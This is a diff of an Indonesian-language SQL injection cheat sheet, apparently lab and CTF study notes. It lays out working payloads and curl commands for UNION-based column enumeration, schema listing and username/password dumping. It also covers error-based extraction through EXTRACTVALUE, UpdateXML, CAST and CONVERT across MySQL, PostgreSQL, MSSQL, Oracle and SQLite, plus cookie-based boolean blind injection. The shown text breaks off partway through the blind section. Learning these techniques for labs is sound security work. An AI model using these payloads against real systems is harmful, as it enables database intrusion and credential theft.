+  -d "username=administrator'--&password=test" | \
+  grep -i "location\|welcome\|dashboard"
 ```
 
 ---
 
-## NULL Method
+# 🔗 3. Classic / UNION SQL Injection
 
-Jika query:
+> **Precondition UNION Attack:**
+> 
+> - Tahu jumlah kolom query asli
+> - Minimal satu kolom menampilkan data string
 
-```text
-?id=10 UNION SELECT ...
+---
+
+## 3.1 Determining Column Count
+
+### 📌 Tujuan
+
+Sebelum bisa UNION, kita harus tahu berapa kolom yang di-return query asli.
+
+### Method 1: ORDER BY (Paling Cepat)
+
+```
+[Burp] Repeater, inject satu per satu:
+category=Gifts'+ORDER+BY+1--
+category=Gifts'+ORDER+BY+2--
+category=Gifts'+ORDER+BY+3--
+category=Gifts'+ORDER+BY+4--   ← error di sini
 ```
 
-uji:
+Error pada `ORDER BY 4` berarti query punya **3 kolom**.
 
 ```bash
-curl -s \
-'http://TARGET/product?id=10%20UNION%20SELECT%20NULL--%20-'
+for i in 1 2 3 4 5 6; do
+  STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
+    --get --data-urlencode "category=Gifts' ORDER BY $i-- -" \
+    "http://TARGET/filter")
+  echo "ORDER BY $i → HTTP $STATUS"
+done
 ```
 
-Jika error:
+### Method 2: UNION SELECT NULL
 
-```text
-column mismatch
+```
+category=Gifts'+UNION+SELECT+NULL--
+category=Gifts'+UNION+SELECT+NULL,NULL--
+category=Gifts'+UNION+SELECT+NULL,NULL,NULL--   ← 200 OK → 3 kolom
 ```
 
-coba:
+Lanjut tambah NULL sampai tidak error. Jumlah NULL = jumlah kolom.
+
+### Oracle — Special Requirement
+
+[Oracle] Di Oracle, setiap SELECT **wajib** ada FROM clause:
+
+```
+'+UNION+SELECT+NULL+FROM+DUAL--
+'+UNION+SELECT+NULL,NULL+FROM+DUAL--
+'+UNION+SELECT+NULL,NULL,NULL+FROM+DUAL--
+```
+
+---
+
+## 3.2 Finding Displayable Column
+
+### 📌 Tujuan
+
+Setelah tahu jumlah kolom (misal 3), cari kolom mana yang bisa menampilkan string.
+
+```
+[Burp] Repeater — Ganti NULL satu per satu dengan string:
+'+UNION+SELECT+'INJECTA',NULL,NULL--    ← test col 1
+'+UNION+SELECT+NULL,'INJECTB',NULL--    ← test col 2
+'+UNION+SELECT+NULL,NULL,'INJECTC'--    ← test col 3
+```
+
+Kolom yang menampilkan `INJECTA`/`INJECTB`/`INJECTC` di response = displayable column.
+
+> **Tip:** Jika data asli muncul di response dan menghalangi inject row, gunakan `id=0` atau `id=99999` (ID yang tidak exist di DB) agar hanya row inject yang tampil.
+
+---
+
+## 3.3 Retrieving Data from Other Tables
+
+### 📌 Skenario
+
+DB punya tabel `users` dengan kolom `username` dan `password`.
+
+```
+[Burp] 2 kolom, keduanya displayable:
+'+UNION+SELECT+username,password+FROM+users--
+```
+
+**Response yang diharapkan:**
+
+```
+administrator | s3cr3t_p4ssw0rd
+wiener        | bluecheese
+```
 
 ```bash
-curl -s \
-'http://TARGET/product?id=10%20UNION%20SELECT%20NULL,NULL--%20-'
+curl -s 'http://TARGET/filter?category=Gifts%27+UNION+SELECT+username,password+FROM+users--' \
+  | grep -oP '<td>[^<]+</td>' | paste - -
 ```
 
-Kemudian:
+---
 
-```bash
-curl -s \
-'http://TARGET/product?id=10%20UNION%20SELECT%20NULL,NULL,NULL--%20-'
+## 3.4 Retrieving Multiple Values in One Column
+
+### 📌 Skenario
+
+Query hanya punya **1 kolom displayable**. Dump username dan password bersamaan.
+
+### Teknik: Concatenation
+
+Gabungkan dua nilai dengan separator yang mudah dikenali.
+
+```
+[PgSQL/Oracle] Pipe concatenation:
+'+UNION+SELECT+NULL,username||'~'||password+FROM+users--
+
+[MySQL] CONCAT function:
+'+UNION+SELECT+NULL,CONCAT(username,'~',password)+FROM+users-- -
+
+[MSSQL] Plus operator:
+'+UNION+SELECT+NULL,username+'~'+password+FROM+users--
 ```
 
-Contoh:
+**Response:**
 
-```text
-1 NULL     → error
-2 NULL     → error
-3 NULL     → success
+```
+administrator~s3cr3t_p4ssw0rd
+wiener~bluecheese
 ```
 
-Kesimpulan:
+### Separator Pilihan
 
-```text
-3 columns
+```
+~    → mudah dikenali (0x7e di hex)
+:    → username:password format
+|    → pipeline (hindari jika ada pipe filtering)
 ```
 
-> ⚠️ **Oracle Special:** Di Oracle Database, seluruh query `SELECT` **wajib** memiliki `FROM` clause.
-> Gunakan tabel dummy bawaan Oracle yaitu `FROM DUAL`:
-> ```sql
-> ORDER BY 1--
-> UNION SELECT NULL FROM DUAL--
-> UNION SELECT NULL,NULL FROM DUAL--
-> UNION SELECT NULL,NULL,NULL FROM DUAL--
+---
+
+## 3.5 Querying DB Version — Oracle (Lab 3)
+
+```
+[Oracle] v$version mengandung version info:
+'+UNION+SELECT+BANNER,NULL+FROM+v$version--
+'+UNION+SELECT+BANNER,NULL+FROM+v$version+WHERE+ROWNUM=1--
+```
+
+**Response:**
+
+```
+Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production
+```
+
+> **[Oracle] Note:** Selalu butuh `FROM` di setiap SELECT. Untuk SELECT tanpa tabel nyata, gunakan `FROM DUAL`:
+> 
+> ```
+> '+UNION+SELECT+'abc','def'+FROM+DUAL--
 > ```
 
 ---
 
-# 2.2 Find Displayable Columns
+## 3.6 Querying DB Version — MySQL & MSSQL (Lab 4)
 
-## 📌 Kapan Digunakan
+**[MySQL]**
 
-Setelah mengetahui jumlah kolom.
-
-Misalnya:
-
-```text
-3 columns
+```
+'+UNION+SELECT+@@version,NULL-- -
+'+UNION+SELECT+@@version,NULL#
 ```
 
-Gunakan:
+**Response:**
 
-```text
-UNION SELECT 'A','B','C'
+```
+8.0.32-MySQL Community Server
 ```
 
-Command:
+**[MSSQL]**
 
-```bash
-curl -s \
-'http://TARGET/product?id=10%20UNION%20SELECT%20%27A%27,%27B%27,%27C%27--%20-'
+```
+'+UNION+SELECT+@@VERSION,NULL--
 ```
 
-Expected:
+**Response:**
 
-```text
-Product: A
-Description: B
-Price: C
+```
+Microsoft SQL Server 2019 (RTM-CU18)...
 ```
 
-Artinya:
+> **MySQL Comment Gotcha:** `--` sendiri tidak valid di MySQL. Gunakan:
+> 
+> - `-- -` (dash dash space dash)
+> - `--` (dash dash space — trailing space)
+> - `#` / `%23` di URL
 
-```text
-column 1 → displayable
-column 2 → displayable
-column 3 → displayable
+---
+
+## 3.7 Listing DB Contents — Non-Oracle (Lab 5)
+
+### Step 1 — List Tables
+
+**[MySQL/PgSQL]**
+
+```
+'+UNION+SELECT+table_name,NULL+FROM+information_schema.tables+WHERE+table_schema=database()-- -
 ```
 
-Contoh lain:
+**[MSSQL]**
 
-```text
-column 1 → tidak terlihat
-column 2 → "B"
-column 3 → "C"
+```
+'+UNION+SELECT+name,NULL+FROM+sys.tables--
 ```
 
-Maka:
+**Response:**
 
-```text
-2 dan 3 = displayable
+```
+users_abcdef
+products
+orders
+```
+
+### Step 2 — List Columns dari Tabel Target
+
+**[MySQL/PgSQL]**
+
+```
+'+UNION+SELECT+column_name,NULL+FROM+information_schema.columns+WHERE+table_name='users_abcdef'-- -
+```
+
+**[MSSQL]**
+
+```
+'+UNION+SELECT+c.name,NULL+FROM+sys.columns+c+JOIN+sys.tables+t+ON+c.object_id=t.object_id+WHERE+t.name='users'--
+```
+
+### Step 3 — Dump Data
+
+```
+'+UNION+SELECT+username_col,password_col+FROM+users_abcdef-- -
+```
+
+### MySQL — GROUP_CONCAT (Ambil Semua Sekaligus)
+
+```
+'+UNION+SELECT+GROUP_CONCAT(table_name),NULL+FROM+information_schema.tables+WHERE+table_schema=database()-- -
+'+UNION+SELECT+GROUP_CONCAT(column_name),NULL+FROM+information_schema.columns+WHERE+table_name='users'-- -
+'+UNION+SELECT+GROUP_CONCAT(username,0x3a,password),NULL+FROM+users-- -
+```
+
+> ⚠️ **[MySQL] GROUP_CONCAT limit:** Default `group_concat_max_len` = 1024 bytes. Output bisa terpotong. Jika perlu lebih: `SET group_concat_max_len=65536` (jika stacked query didukung), atau pakai `LIMIT/OFFSET` per row.
+
+### PostgreSQL — STRING_AGG
+
+```
+'+UNION+SELECT+string_agg(table_name,','),NULL+FROM+information_schema.tables+WHERE+table_schema='public'--
+```
+
+### MSSQL — STRING_AGG (SQL Server 2017+)
+
+```
+'+UNION+SELECT+STRING_AGG(name,','),NULL+FROM+sys.tables--
+'+UNION+SELECT+STRING_AGG(name,','),NULL+FROM+sys.columns+WHERE+object_id=OBJECT_ID('users')--
 ```
 
 ---
 
-# 2.3 UNION SELECT Exploitation
+## 3.8 Listing DB Contents — Oracle (Lab 6)
 
-## 📌 Kapan Digunakan
+### 📌 Perbedaan dari Non-Oracle
 
-Gunakan ketika:
+Oracle **tidak punya `information_schema`**. Gunakan `all_tables` dan `all_tab_columns`.
 
-```text
-UNION berhasil
-AND
-jumlah kolom diketahui
-AND
-minimal satu column dapat ditampilkan
+### Step 1 — List Tables
+
+```
+'+UNION+SELECT+table_name,NULL+FROM+all_tables--
+```
+
+### Step 2 — List Columns
+
+```
+'+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_ABCDEF'--
+```
+
+> ⚠️ **[Oracle]:** Nama tabel di `all_tab_columns` biasanya uppercase.
+
+### Step 3 — Dump Data
+
+```
+'+UNION+SELECT+USERNAME_COL,PASSWORD_COL+FROM+USERS_ABCDEF--
 ```
 
 ---
 
-## Step A — Confirm Column Count
-
-Contoh:
-
-```text
-ORDER BY 4 → error
-```
-
-Kesimpulan:
-
-```text
-3 columns
-```
-
-Confirm:
-
-```bash
-curl -s \
-'http://TARGET/product?id=10%20UNION%20SELECT%20NULL,NULL,NULL--%20-'
-```
-
-Expected:
-
-```text
-HTTP 200
-```
-
----
-
-## Step B — Find String Columns
-
-```bash
-curl -s \
-'http://TARGET/product?id=10%20UNION%20SELECT%20%27A%27,%27B%27,%27C%27--%20-'
-```
-
-Expected output:
-
-```text
-Product: A
-Description: B
-Price: C
-```
-
----
-
-## Step C — Extract Database Name
-
-### MySQL
-
-```text
-database()
-```
-
-Payload:
-
-```bash
-curl -s \
-'http://TARGET/product?id=10%20UNION%20SELECT%20database(),%27B%27,%27C%27--%20-'
-```
-
-Output:
-
-```text
-Product: shopdb
-Description: B
-Price: C
-```
-
----
-
-### PostgreSQL
-
-```sql
-current_database()
-```
-
-Command:
-
-```bash
-curl -s \
-'http://TARGET/product?id=10%20UNION%20SELECT%20current_database(),%27B%27,%27C%27--%20-'
-```
-
-Output:
-
-```text
-Product: appdb
-```
-
----
-
-### MSSQL
-
-```sql
-DB_NAME()
-```
-
-Command:
-
-```bash
-curl -s \
-'http://TARGET/product?id=10%20UNION%20SELECT%20DB_NAME(),%27B%27,%27C%27--%20-'
-```
-
-Output:
-
-```text
-Product: webapp
-```
-
----
-
-## Step D — Extract Table Names
-
-### MySQL
-
-```sql
-SELECT table_name
-FROM information_schema.tables
-WHERE table_schema=database()
-```
-
-Dengan `GROUP_CONCAT`:
-
-```bash
-curl -s \
-'http://TARGET/product?id=10%20UNION%20SELECT%20GROUP_CONCAT(table_name),%27B%27,%27C%27%20FROM%20information_schema.tables%20WHERE%20table_schema=database()--%20-'
-```
-
-Contoh:
-
-```text
-Product:
-users,products,orders
-```
-
----
-
-### PostgreSQL
-
-```sql
-SELECT string_agg(table_name,',')
-FROM information_schema.tables
-WHERE table_schema='public'
-```
-
-Contoh:
-
-```text
-users,products,sessions
-```
-
----
-
-### MSSQL
-
-```sql
-SELECT STRING_AGG(name,',')
-FROM sys.tables
-```
-
-Contoh:
-
-```text
-users,orders,customers
-```
-
----
-
-## Step E — Extract Column Names
-
-### MySQL
-
-```bash
-curl -s \
-'http://TARGET/product?id=10%20UNION%20SELECT%20GROUP_CONCAT(column_name),%27B%27,%27C%27%20FROM%20information_schema.columns%20WHERE%20table_name=%27users%27--%20-'
-```
-
-Expected:
-
-```text
-id,username,password,email
-```
-
----
-
-### PostgreSQL
-
-```sql
-SELECT string_agg(column_name,',')
-FROM information_schema.columns
-WHERE table_name='users'
-```
-
----
-
-### MSSQL
-
-```sql
-SELECT STRING_AGG(c.name,',')
-FROM sys.columns c
-JOIN sys.tables t ON c.object_id=t.object_id
-WHERE t.name='users'
-```
-
----
-
-## Step F — Extract Data
-
-Misalnya:
-
-```text
-users
- ├── username
- └── password
-```
-
-### MySQL
-
-```bash
-curl -s \
-'http://TARGET/product?id=10%20UNION%20SELECT%20GROUP_CONCAT(username,0x3a,password),%27B%27,%27C%27%20FROM%20users--%20-'
-```
-
-Expected:
-
-```text
-admin:5f4dcc3b5aa765d61d8327deb882cf99
-guest:084e0343a0486ff05530df6c705c8bb4
-```
-
----
-
-### `CONCAT()` Version
-
-```sql
-CONCAT(username,':',password)
-```
-
----
-
-## Complete UNION Flow
-
-```text
-Find Parameter
-      │
-      ▼
-Single Quote
-      │
-      ▼
-Confirm SQLi
-      │
-      ▼
-ORDER BY
-      │
-      ▼
-Column Count
-      │
-      ▼
-UNION SELECT NULL...
-      │
-      ▼
-Find Displayable Columns
-      │
-      ▼
-DB Name
-      │
-      ▼
-Table Names
-      │
-      ▼
-Column Names
-      │
-      ▼
-Data
-```
-
----
-
-# 2.4 Useful Queries per Database
-
-## Version
-
-|Info|MySQL|PostgreSQL|MSSQL|Oracle|SQLite|
-|---|---|---|---|---|---|
-|Version|`@@version` / `version()`|`version()`|`@@VERSION`|`banner FROM v$version`|`sqlite_version()`|
-|Current DB|`database()`|`current_database()`|`DB_NAME()`|`SYS_CONTEXT('USERENV','DB_NAME')`|`'main'` (file-based)|
-|Current User|`USER()`|`current_user`|`SYSTEM_USER` / `SUSER_SNAME()`|`USER`|`'N/A'` (user proses OS)|
-|All Databases|`information_schema` / `SHOW DATABASES`|`pg_database`|`sys.databases`|`ALL_USERS` / schemas|`PRAGMA database_list`|
-|All Tables|`information_schema.tables`|`information_schema.tables`|`sys.tables`|`all_tables`|`sqlite_master WHERE type='table'`|
-|All Columns|`information_schema.columns`|`information_schema.columns`|`sys.columns`|`all_tab_columns`|`sql FROM sqlite_master` / `table_info()`|
-|Privileges|`information_schema.user_privileges`|`information_schema.role_*`|`fn_my_permissions()`|`session_privs`|`'N/A'` (file permissions OS)|
-
----
-
-## MySQL Cheatsheet
+## 3.9 Useful Queries per Database
 
 ### Version
 
+|DB|Query|
+|---|---|
+|MySQL|`@@version` atau `version()`|
+|PostgreSQL|`version()`|
+|MSSQL|`@@VERSION`|
+|Oracle|`SELECT banner FROM v$version`|
+|SQLite|`sqlite_version()`|
+
+### Current Database
+
+|DB|Query|
+|---|---|
+|MySQL|`database()`|
+|PostgreSQL|`current_database()`|
+|MSSQL|`DB_NAME()`|
+|Oracle|`SYS_CONTEXT('USERENV','DB_NAME') FROM dual`|
+|SQLite|`'main'` (file-based; nama file adalah "database")|
+
+### Current User
+
+|DB|Query|
+|---|---|
+|MySQL|`user()` atau `USER()`|
+|PostgreSQL|`current_user`|
+|MSSQL|`SYSTEM_USER` / `SUSER_SNAME()`|
+|Oracle|`USER FROM dual`|
+|SQLite|N/A (file permissions OS)|
+
+### List Tables
+
+|DB|Query|
+|---|---|
+|MySQL|`SELECT table_name FROM information_schema.tables WHERE table_schema=database()`|
+|PostgreSQL|`SELECT table_name FROM information_schema.tables WHERE table_schema='public'`|
+|MSSQL|`SELECT name FROM sys.tables`|
+|Oracle|`SELECT table_name FROM all_tables`|
+|SQLite|`SELECT name FROM sqlite_master WHERE type='table'`|
+
+### List Columns
+
+|DB|Query|
+|---|---|
+|MySQL|`SELECT column_name FROM information_schema.columns WHERE table_name='users' AND table_schema=database()`|
+|PostgreSQL|`SELECT column_name FROM information_schema.columns WHERE table_schema='public' AND table_name='users'`|
+|MSSQL|`SELECT c.name FROM sys.columns c JOIN sys.tables t ON c.object_id=t.object_id WHERE t.name='users'`|
+|Oracle|`SELECT column_name FROM all_tab_columns WHERE table_name='USERS'`|
+|SQLite|`SELECT sql FROM sqlite_master WHERE type='table' AND name='users'`|
+
+> **[SQLite] Alternatif:** `PRAGMA table_info(users)` — mengembalikan id, name, type, notnull, dflt_value, pk per kolom. Tersedia jika multi-statement didukung.
+
+### Concatenation
+
+|DB|Syntax|
+|---|---|
+|MySQL|`CONCAT(username,':',password)`|
+|PostgreSQL|`username\|':'\|password`|
+|Oracle|`username\|':'\|password`|
+|MSSQL|`username+':'+password`|
+|SQLite|`username\|':'\|password`|
+
+### Privileges (untuk pre-RCE check)
+
+|DB|Query|
+|---|---|
+|MySQL|`SELECT PRIVILEGE_TYPE FROM information_schema.user_privileges WHERE GRANTEE=CONCAT(CHAR(39),user(),CHAR(39))`|
+|PostgreSQL|`SELECT rolsuper, rolcreatedb FROM pg_roles WHERE rolname=current_user`|
+|MSSQL|`SELECT * FROM fn_my_permissions(NULL,'DATABASE')`|
+|Oracle|`SELECT privilege FROM session_privs`|
+
+---
+
+### Per-DB Complete Cheatsheets
+
+#### MySQL / MariaDB
+
 ```sql
+-- Version
 SELECT @@version;
-```
-
-### Current DB
-
-```sql
+-- Current DB
 SELECT database();
-```
-
-### Current User
-
-```sql
+-- Current user
 SELECT user();
-```
-
-### Databases
-
-```sql
+-- All databases
 SHOW DATABASES;
+SELECT schema_name FROM information_schema.schemata;
+-- Tables
+SELECT table_name FROM information_schema.tables WHERE table_schema=database();
+-- Columns
+SELECT column_name FROM information_schema.columns WHERE table_name='users' AND table_schema=database();
+-- Dump (single column)
+SELECT GROUP_CONCAT(username,':',password) FROM users;
+-- Privileges
+SELECT PRIVILEGE_TYPE FROM information_schema.user_privileges WHERE GRANTEE=CONCAT(CHAR(39),user(),CHAR(39));
+-- Secure file check
+SELECT @@secure_file_priv;
 ```
 
-### Tables
+#### PostgreSQL
 
 ```sql
-SELECT table_name
-FROM information_schema.tables
-WHERE table_schema=database();
-```
-
-### Columns
-
-```sql
-SELECT column_name
-FROM information_schema.columns
-WHERE table_name='users'
-AND table_schema=database();
-```
-
-### Privileges
-
-```sql
-SELECT * FROM information_schema.user_privileges;
-```
-
----
-
-## PostgreSQL Cheatsheet
-
-### Version
-
-```sql
+-- Version
 SELECT version();
-```
-
-### Current DB
-
-```sql
+-- Current DB
 SELECT current_database();
-```
-
-### Current User
-
-```sql
+-- Current user
 SELECT current_user;
-```
-
-### Databases
-
-```sql
+-- All databases
 SELECT datname FROM pg_database;
+-- Tables (public schema)
+SELECT table_name FROM information_schema.tables WHERE table_schema='public';
+-- Columns
+SELECT column_name FROM information_schema.columns WHERE table_schema='public' AND table_name='users';
+-- Dump (single column)
+SELECT string_agg(username||':'||password,',') FROM users;
+-- Roles / superuser check
+SELECT rolname, rolsuper, rolcreatedb FROM pg_roles WHERE rolname=current_user;
 ```
 
-### Tables
+#### MSSQL
 
 ```sql
-SELECT table_name
-FROM information_schema.tables
-WHERE table_schema='public';
-```
-
-### Columns
-
-```sql
-SELECT column_name
-FROM information_schema.columns
-WHERE table_schema='public'
-AND table_name='users';
-```
-
-### Roles/Privileges
-
-```sql
-SELECT current_user;
-```
-
-Role inspection:
-
-```sql
-SELECT rolname, rolsuper, rolcreaterole, rolcreatedb
-FROM pg_roles;
-```
-
----
-
-## MSSQL Cheatsheet
-
-### Version
-
-```sql
+-- Version
 SELECT @@VERSION;
-```
-
-### Current DB
-
-```sql
+-- Current DB
 SELECT DB_NAME();
-```
-
-### Current User
-
-```sql
+-- Current user
 SELECT SYSTEM_USER;
-```
-
-### Databases
-
-```sql
+-- All databases
 SELECT name FROM sys.databases;
-```
-
-### Tables
-
-```sql
+-- Tables
 SELECT name FROM sys.tables;
+-- Columns
+SELECT c.name FROM sys.columns c JOIN sys.tables t ON c.object_id=t.object_id WHERE t.name='users';
+-- Dump
+SELECT STRING_AGG(username+':'+password,',') FROM users;  -- SQL Server 2017+
+SELECT username+':'+password FROM users FOR XML PATH('');  -- Older versions
+-- Privileges
+SELECT * FROM fn_my_permissions(NULL,'DATABASE');
 ```
 
-### Columns
+#### Oracle
 
 ```sql
-SELECT name
-FROM sys.columns
-WHERE object_id=OBJECT_ID('dbo.users');
-```
-
-### Privileges
-
-```sql
-SELECT *
-FROM fn_my_permissions(NULL, 'DATABASE');
-```
-
----
-
-## Oracle Cheatsheet
-
-### Version
-
-```sql
+-- Version
 SELECT banner FROM v$version;
-```
-
-### Current DB
-
-```sql
+-- Current DB
 SELECT SYS_CONTEXT('USERENV','DB_NAME') FROM dual;
-```
-
-### Current User
-
-```sql
+-- Current user
 SELECT USER FROM dual;
-```
-
-### Schemas/Users
-
-```sql
+-- All schemas/users
 SELECT username FROM all_users;
-```
-
-### Tables
-
-```sql
+-- Tables (visible to current user)
 SELECT table_name FROM all_tables;
-```
-
-### Columns
-
-```sql
-SELECT column_name
-FROM all_tab_columns
-WHERE table_name='USERS';
-```
-
-### Privileges
-
-```sql
+-- Columns
+SELECT column_name FROM all_tab_columns WHERE table_name='USERS';
+-- Dump (single column)
+SELECT LISTAGG(username||':'||password,',') WITHIN GROUP (ORDER BY username) FROM users;
+-- Privileges
 SELECT privilege FROM session_privs;
 ```
 
----
+#### SQLite — Special Notes
 
-## SQLite Cheatsheet
-
-### Version
 ```sql
+-- Version
 SELECT sqlite_version();
-```
-
-### Tables
-```sql
+-- Tables (NO information_schema!)
 SELECT name FROM sqlite_master WHERE type='table';
-```
-
-### Columns & Table Schema
-```sql
--- Membaca definisi pembuatan tabel (memuat seluruh nama kolom):
+-- Table schema (get column names)
 SELECT sql FROM sqlite_master WHERE type='table' AND name='users';
-
--- ATAU via PRAGMA (jika multi-statement query didukung):
+-- Columns via PRAGMA (jika didukung)
 PRAGMA table_info(users);
+-- Dump
+SELECT group_concat(username||':'||password) FROM users;
 ```
 
-### Data Extraction
-```sql
--- Menggabungkan seluruh baris username & password menjadi satu string:
-SELECT group_concat(username || ':' || password) FROM users;
-```
-
-### Karakteristik Kritis SQLite di CTF:
-- **Tidak Memiliki `information_schema`:** SQLite TIDAK memiliki katalog schema standar. Selalu gunakan `sqlite_master` sebagai gantinya.
-- **Tidak Ada Native `SLEEP()`:** SQLite tidak memiliki fungsi delay bawaan. Timing-based blind SQLi umumnya tidak bisa dilakukan secara langsung (harus mengandalkan query komputasi berat/randomblob jika didukung).
-- **File-Based Security:** Tidak ada sistem user database terpisah; hak akses database sepenuhnya diatur oleh file permissions sistem operasi (`.sqlite`, `.db`, `.sqlite3`).
+> **⚠️ SQLite Critical Limitations:**
+> 
+> 1. **Tidak ada `information_schema`** — selalu gunakan `sqlite_master`
+> 2. **Tidak ada native `SLEEP()`** — time-based blind umumnya tidak bisa dilakukan (SQLite tidak punya fungsi delay bawaan)
+> 3. **File-Based Security** — tidak ada sistem user database terpisah; hak akses diatur oleh file permissions OS (`.sqlite`, `.db`, `.sqlite3`)
+> 4. **Stacked queries** — tergantung API/driver yang digunakan aplikasi
 
 ---
 
-# 💥 3. Error-Based SQL Injection
+# 💥 4. Error-Based SQL Injection
 
-# 3.1 MySQL Error-Based
+## 4.1 Visible Error-Based — PostgreSQL CAST (Lab 13)
 
-## 📌 Kapan Digunakan
+### 📌 Skenario
 
-Saat database error ditampilkan dan fungsi error dapat memaksa data muncul di error message.
+Aplikasi menampilkan error message dari database yang mengandung data. Contoh verbose error:
+
+```
+ERROR: invalid input syntax for type integer: "administrator"
+```
+
+Data (`administrator`) muncul di error message!
+
+### Teknik: CAST Type Mismatch
+
+Paksa DB convert string ke integer → error berisi nilai query.
+
+**[PgSQL] Payload:**
+
+```
+'+AND+CAST((SELECT+username+FROM+users+LIMIT+1)+AS+integer)--
+```
+
+**[Burp] Inject di cookie atau parameter:**
+
+```
+TrackingId=xyz'+AND+CAST((SELECT+username+FROM+users+LIMIT+1)+AS+integer)--
+```
+
+**Error yang muncul:**
+
+```
+ERROR: invalid input syntax for type integer: "administrator"
+```
+
+→ `administrator` adalah username pertama!
+
+**Lanjut dump password:**
+
+```
+'+AND+CAST((SELECT+password+FROM+users+WHERE+username='administrator'+LIMIT+1)+AS+integer)--
+```
+
+**Error:**
+
+```
+ERROR: invalid input syntax for type integer: "s3cr3t_p4ssw0rd"
+```
 
 ---
 
-## ExtractValue
+## 4.2 MySQL Error-Based
 
-Contoh payload:
+### 📌 Kapan Digunakan
 
-```sql
-AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT database()),0x7e))
+Saat DB menampilkan error dan MySQL fungsi error-based tersedia.
+
+### ExtractValue
+
+```
+[MySQL]
+'+AND+EXTRACTVALUE(1,CONCAT(0x7e,(SELECT+database()),0x7e))-- -
 ```
 
-Encoded curl:
+**Response:**
 
-```bash
-curl -s \
-'http://TARGET/product?id=10%20AND%20EXTRACTVALUE(1,CONCAT(0x7e,(SELECT%20database()),0x7e))'
 ```
-
-Expected:
-
-```text
 XPATH syntax error: '~shopdb~'
 ```
 
+Data muncul di antara `~`. Lanjut ekstrak tabel:
+
+```
+'+AND+EXTRACTVALUE(1,CONCAT(0x7e,(SELECT+GROUP_CONCAT(table_name)+FROM+information_schema.tables+WHERE+table_schema=database()),0x7e))-- -
+```
+
+**Response:**
+
+```
+XPATH syntax error: '~users,products,orders~'
+```
+
+### UpdateXML
+
+```
+[MySQL]
+'+AND+UPDATEXML(NULL,CONCAT(0x7e,(SELECT+database()),0x7e),NULL)-- -
+```
+
+> ⚠️ **[MySQL] ExtractValue / UpdateXML output limit:** ~32 karakter per error. Untuk nilai panjang gunakan SUBSTRING:
+> 
+> ```
+> '+AND+EXTRACTVALUE(1,CONCAT(0x7e,SUBSTRING((SELECT+password+FROM+users+LIMIT+1),1,30),0x7e))-- -
+> '+AND+EXTRACTVALUE(1,CONCAT(0x7e,SUBSTRING((SELECT+password+FROM+users+LIMIT+1),31,60),0x7e))-- -
+> ```
+
 ---
 
-## UpdateXML
+## 4.3 MSSQL Error-Based
 
-```sql
-AND UPDATEXML(NULL,CONCAT(0x7e,(SELECT database()),0x7e),NULL)
+### CONVERT Type Mismatch
+
+```
+[MSSQL]
+'+AND+1=CONVERT(int,(SELECT+TOP+1+name+FROM+sys.databases))--
 ```
 
-Command:
+**Error:**
 
-```bash
-curl -s \
-'http://TARGET/product?id=10%20AND%20UPDATEXML(NULL,CONCAT(0x7e,(SELECT%20database()),0x7e),NULL)'
 ```
-
-Expected:
-
-```text
-XPATH syntax error: '~shopdb~'
-```
-
-> Teknik ini bergantung pada database/version dan fungsi yang tersedia.
-
----
-
-# 3.2 MSSQL Error-Based
-
-## 📌 Kapan Digunakan
-
-Saat MSSQL mengembalikan type-conversion errors yang dapat membawa nilai query.
-
-Contoh pola:
-
-```sql
-AND 1=CONVERT(int,(SELECT TOP 1 name FROM sys.databases))
-```
-
-Command:
-
-```bash
-curl -s \
-'http://TARGET/item?id=10%20AND%201=CONVERT(int,(SELECT%20TOP%201%20name%20FROM%20sys.databases))'
-```
-
-Expected:
-
-```text
 Conversion failed when converting the nvarchar value 'master' to data type int.
 ```
 
-Artinya:
+### Dump Step by Step
 
-```text
-Data muncul di error message
+```
+[MSSQL]
+-- DB name
+'+AND+1=CONVERT(int,(SELECT+DB_NAME()))--
+
+-- Tables
+'+AND+1=CONVERT(int,(SELECT+TOP+1+name+FROM+sys.tables))--
+
+-- Next table (skip yang sudah ditampilkan)
+'+AND+1=CONVERT(int,(SELECT+TOP+1+name+FROM+sys.tables+WHERE+name+NOT+IN+('users')))--
 ```
 
 ---
 
-# 3.3 PostgreSQL Error-Based
+## 4.4 PostgreSQL Error-Based
 
-## 📌 Kapan Digunakan
+### CAST ke Integer
 
-Saat PostgreSQL memberikan error detail dan type cast dapat dipakai untuk membuat error berisi data.
-
-Contoh:
-
-```sql
-CAST((SELECT current_database()) AS integer)
+```
+[PgSQL]
+'+AND+1=CAST((SELECT+current_database())+AS+integer)--
 ```
 
-Command:
+**Error:**
 
-```bash
-curl -s \
-'http://TARGET/item?id=10%20AND%201=CAST((SELECT%20current_database())%20AS%20integer)'
 ```
-
-Expected:
-
-```text
 invalid input syntax for type integer: "appdb"
 ```
 
----
+### Dump Users
 
-# 🕵️ 4. Boolean Blind SQL Injection
-
-# 4.1 Konsep Boolean Blind
-
-## 📌 Kapan Digunakan
-
-Saat:
-
-```text
-SQLi ada
-BUT
-database result tidak tampil
-AND
-SQL error tidak muncul.
 ```
-
-Anda mengandalkan:
-
-```text
-TRUE response
-vs
-FALSE response
+[PgSQL]
+'+AND+1=CAST((SELECT+username+FROM+users+LIMIT+1)+AS+integer)--
+'+AND+1=CAST((SELECT+password+FROM+users+WHERE+username='administrator')+AS+integer)--
 ```
 
 ---
 
-## Diagram
+# 🕵️ 5. Boolean Blind SQL Injection
 
-```text
-             Injection
-                 │
-                 ▼
-          SQL Condition
-            /        \
-         TRUE        FALSE
-          │            │
-          ▼            ▼
-    Response A     Response B
-          │            │
-          └─────┬──────┘
-                ▼
-           Compare
-                │
-                ▼
-            Infer Data
+## 5.1 Blind — Conditional Responses (Lab 11)
+
+### 📌 Skenario
+
+Inject ke dalam **Cookie** (`TrackingId`). Aplikasi tidak tampilkan data, tapi response beda kalau kondisi TRUE vs FALSE:
+
+- **TRUE** → ada teks `Welcome back!` di response
+- **FALSE** → tidak ada
+
+**Apa yang kita ketahui dari ini:**
+
+- Response ada dua state yang bisa dibedakan
+- Kita bisa construct condition apapun dan observe state
+
+### Konfirmasi Boolean Blind
+
+```
+[Burp] Modifikasi cookie:
+Cookie: TrackingId=xyz'+AND+'1'='1; session=...
+```
+
+→ Cek apakah `Welcome back!` muncul (TRUE).
+
+```
+Cookie: TrackingId=xyz'+AND+'1'='2; session=...
+```
+
+→ `Welcome back!` tidak muncul (FALSE).
+
+Jika kedua response **berbeda** → Boolean Blind SQLi terkonfirmasi.
+
+### Konfirmasi Ada Tabel dan User
+
+```
+-- Tabel users ada?
